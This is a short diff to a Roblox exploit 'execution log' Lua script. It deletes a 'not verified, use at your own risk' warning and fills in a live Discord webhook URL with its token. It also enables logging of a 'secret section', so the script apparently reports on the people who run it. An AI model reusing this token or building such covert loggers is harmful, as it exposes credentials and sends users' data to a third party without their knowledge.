@@ -1,11 +1,6 @@
---[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-
---// Config
-getgenv().whscript = "Your Script Name"        --Change to the name of your script
-getgenv().webhookexecUrl = "Your Webhook Url"  --Put your Webhook Url here
-getgenv().ExecLogSecret = false                --decide to also log secret section
+getgenv().whscript = "Remedy.EZ"  
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1285032038851805206/qyoaaeRne2zzt5MgGOLQMOXNJ9R3-NImr7M5pq4BsyDLjlVFC5TqUEU6gC4fkiXKkUKC"
+getgenv().ExecLogSecret = true 
 
 --// Execution Log Script
 local ui = gethui()
